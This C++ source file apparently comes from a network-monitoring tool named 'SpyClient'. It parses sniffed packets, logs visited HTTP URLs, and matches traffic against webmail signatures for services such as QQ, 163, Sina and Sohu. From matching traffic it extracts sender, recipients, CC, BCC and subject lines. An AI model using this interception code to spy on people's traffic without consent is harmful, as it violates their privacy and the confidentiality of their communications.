// DealPacketThread.cpp : 实现文件
//

#include "stdafx.h"
#include "SpyClient.h"
#include "DealPacketThread.h"


#define PROVIDER_COUNT 7
ext_string emailfilters[PROVIDER_COUNT][3] = {
	{"163_126_yeah","cwebmail.mail.163.com","name%3d%22action%22%3edeliver"},
	//{"126","cwebmail.mail.126.com","account"},
	{"qq","mail.qq.com","cginame=compose_send"},
	{"yahoo","","\"simplebody\""},
	{"sina","","content-disposition: form-data; name=\"from\""},
	{"sohu","","addressbook_use_flag"},
	{"139","","<string name=\"account\">"},
	{"smtp","","x-mailer: foxmail"}
};
// CDealPacketThread

IMPLEMENT_DYNCREATE(CDealPacketThread, CWinThread)

CDealPacketThread::CDealPacketThread()
{
	EnableAutomation();
}

CDealPacketThread::~CDealPacketThread()
{
}

BOOL CDealPacketThread::InitInstance()
{
	// TODO: 在此执行任意逐线程初始化
	BOOL worked=CWinThread::InitInstance();
	CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
	MSG msg;
	PeekMessage(&msg, NULL, WM_USER, WM_USER, PM_NOREMOVE);
	return TRUE;
}

int CDealPacketThread::ExitInstance()
{
	// TODO: 在此执行任意逐线程清理
	return CWinThread::ExitInstance();
}

void CDealPacketThread::OnFinalRelease()
{
	// 释放了对自动化对象的最后一个引用后，将调用
	// OnFinalRelease。基类将自动
	// 删除该对象。在调用该基类之前，请添加您的
	// 对象所需的附加清理代码。
	CWinThread::OnFinalRelease();
}

void CDealPacketThread::SetPbThread(CWinThread* pfthread)
{
	this->pfthread = pfthread;
}

BEGIN_MESSAGE_MAP(CDealPacketThread, CWinThread)
	ON_THREAD_MESSAGE(DEALPACKET_MESSAGE, OnDealPacketMessage)
END_MESSAGE_MAP()


// CDealPacketThread 消息处理程序

int CDealPacketThread::DetectWebMailProvider(std::ext_string httppostdata,std::ext_string host,std::ext_string url)
{

	httppostdata.tolower();
	host.tolower();
	url.tolower();

	for(int i=0;i<PROVIDER_COUNT;i++)
	{
		if(std::string::npos!=httppostdata.find(emailfilters[i][2]))
		{	
			return i;
		}
	}
	return -1;
}


void CDealPacketThread::HttpPacketHandler(std::ext_string httpdatastr,IpPacket *ipobj,u_int httpdatalen)
{
	//std::cout<<"httpdatastr data:"<<httpdatastr<<std::endl;
	vector<ext_string> linessplit = httpdatastr.split("\n");
	ext_string url("") ;
	ext_string host("");

	bool ispost = false;
	ext_string httppostdata("");

	ext_string hostprefix("host:");
	ext_string getprefix("get /");
	ext_string postprefix("post /");

	for (std::vector<ext_string>::iterator it = linessplit.begin() ; it != linessplit.end(); ++it)
	{
		ext_string currline = *it;
		currline.tolower();

		if(currline.substr(0, hostprefix.size()) == hostprefix)
		{
			std::vector<ext_string> tmp = currline.split(" ");
			if(tmp.size()>=2)
				host = tmp[1].trim();
		}
		else if(currline.substr(0, getprefix.size()) == getprefix)
		{
			std::vector<ext_string> tmp = currline.split(" ");
			if(tmp.size()>=2)
				url = tmp[1].trim();
		}
		else if(currline.substr(0, postprefix.size()) == postprefix)
		{
			ispost = true;
			std::vector<ext_string> tmp = currline.split(" ");
			if(tmp.size()>=2)
				url = tmp[1].trim();
		}
	}

	ext_string httpurl_ext = "http://"+host+url;	
	HttpPacket* httpobj = new HttpPacket();
	httpobj->set_sip(ipobj->sip());
	httpobj->set_dip(ipobj->dip());
	httpobj->set_sport(ipobj->sport());
	httpobj->set_dport(ipobj->dport());
	httpobj->set_datetime(ipobj->datetime());
	httpobj->set_httpurl(httpurl_ext.c_str());
	pfthread->PostThreadMessage(PROTOBUF_HTTP_MESSAGE, 0, (LPARAM)httpobj);
	//delete httpobj;
	httpobj=NULL;
	//CLogMod::SharedInstance()->LogInfo(httpurl_ext.c_str());
	//#BUG print bug here
	// cout<<"httpurl_ext:"<<httpurl_ext<<endl;
}

void CDealPacketThread::UdpPacketHandler(const u_char *udpdata,IpPacket *ipobj,u_int udpdatalen)
{
	PROTOCOL_DEFINE::UDP_HEADER *udp=(PROTOCOL_DEFINE::UDP_HEADER *)udpdata;
	ipobj->set_dport(ntohs(udp->dport));
	ipobj->set_sport(ntohs(udp->sport));
	ipobj->set_protocoltype(UDP_PROTOCOL);
	pfthread->PostThreadMessage(PROTOBUF_IP_MESSAGE, 0, (LPARAM)ipobj);
	ipobj = NULL;
	udp = NULL;
}

void CDealPacketThread::TcpPacketHandler(const u_char *tcpdata,IpPacket *ipobj,u_int tcpdatalen)
{   
	PROTOCOL_DEFINE::TCP_HEADER *tcp=(PROTOCOL_DEFINE::TCP_HEADER *)tcpdata;
	ipobj->set_dport(ntohs(tcp->dport));
	ipobj->set_sport(ntohs(tcp->sport));
	ipobj->set_protocoltype(TCP_PROTOCOL);
	u_int tcpheaderlen=PROTOCOL_DEFINE::GetTCPHeaderLength(tcp);
	tcp = NULL;
	if(tcpdatalen-tcpheaderlen)
	{

		std::string tcpdatastr((char*)(tcpdata+tcpheaderlen),tcpdatalen-tcpheaderlen);
		std::ext_string tcpdata_extstr(tcpdatastr);
		tcpdata_extstr.tolower();
		if(std::string::npos!=tcpdata_extstr.find("user-agent:") &&
			std::string::npos!=tcpdata_extstr.find("connection:"))
		{
			HttpPacketHandler(tcpdatastr,ipobj,tcpdatalen-tcpheaderlen);
		}
		int emailprovider = DetectWebMailProvider(tcpdatastr,"","");
		if(-1 != emailprovider)
		{
			cout<<"found emailprovider:"<<emailprovider<<endl;
			EmailParse* emailparse = new EmailParse();
			emailparse->SetEmailProvider(emailprovider);
			emailparse->RunParse(tcpdatastr);
			ext_string from_ext;
			from_ext = emailparse->GetSendMailObj();
			if(string::npos!=from_ext.find("@"))
			{
				EmailPacket *emailobj = new EmailPacket();
				CopyEmailObj(emailobj,ipobj,emailparse);
				pfthread->PostThreadMessage(PROTOBUF_EMAIL_MESSAGE,0,(LPARAM)emailobj);
			}
			delete emailparse;
		}
	}
	pfthread->PostThreadMessage(PROTOBUF_IP_MESSAGE, 0, (LPARAM)ipobj);
	ipobj=NULL;
}

void CDealPacketThread::CopyEmailObj(EmailPacket *emailobj, IpPacket *ipobj, EmailParse *emailparse)
{
	emailobj->set_sip(ipobj->sip());
	emailobj->set_dip(ipobj->dip());
	emailobj->set_sport(ipobj->sport());
	emailobj->set_dport(ipobj->dport());
	emailobj->set_datetime(ipobj->datetime());
	emailobj->set_sendfrom(emailparse->GetSendMailObj());
	emailobj->set_sendto(emailparse->GetToMailObj());
	emailobj->set_sendcc(emailparse->GetCcMailObj());
	emailobj->set_sendbcc(emailparse->GetBccMailObj());
	emailobj->set_subject(emailparse->GetSubJectObj());
}

void CDealPacketThread::OnDealPacketMessage(WPARAM wParam, LPARAM lParam)
{
	PacketArg *packetarg = (PacketArg *)lParam;
	switch(packetarg->protocol_type)
	{
	case TCP:TcpPacketHandler(packetarg->pdata,packetarg->ipobj,packetarg->datalen);break;
	case UDP:UdpPacketHandler(packetarg->pdata,packetarg->ipobj,packetarg->datalen);break;
	}
	delete packetarg;
	packetarg = NULL;
}